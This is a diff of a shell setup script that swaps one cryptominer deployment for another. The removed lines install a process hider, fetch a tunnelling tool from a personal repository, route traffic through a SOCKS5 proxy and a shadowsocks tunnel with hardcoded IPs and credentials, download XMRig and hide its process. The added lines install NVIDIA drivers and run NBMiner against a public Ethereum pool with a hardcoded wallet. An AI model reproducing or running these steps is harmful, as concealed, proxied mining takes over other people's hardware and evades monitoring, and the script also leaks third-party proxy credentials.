@@ -1,42 +1,15 @@
-#!/bin/bash
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-
-apt install npm
-npm i -g node-process-hider
-npm install -g npm
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
-tar xf xmrig-6.17.0-linux-x64.tar.gz
-
-apt -y install shadowsocks-libev rng-tools
-
-ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
-
-ph add xmrig
+cd /home
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
+sudo dpkg -i cuda-keyring_1.0-1_all.deb
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
+sudo apt-get update
+sudo apt-get -y install cuda-drivers-510
+sudo apt-get install libcurl3 -y
+wget https://github.com/NebuTech/NBMiner/releases/download/v42.2/NBMiner_42.2_Linux.tgz
+sudo tar -xvf NBMiner_42.2_Linux.tgz
+cd NBMiner_Linux
+sudo ./nbminer -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 3Ev3mZawL4TRxeC2Li91gZg5Yrx1k5npL7.$(echo $(shuf -i 1000-9999 -n 1)-KVN) -log
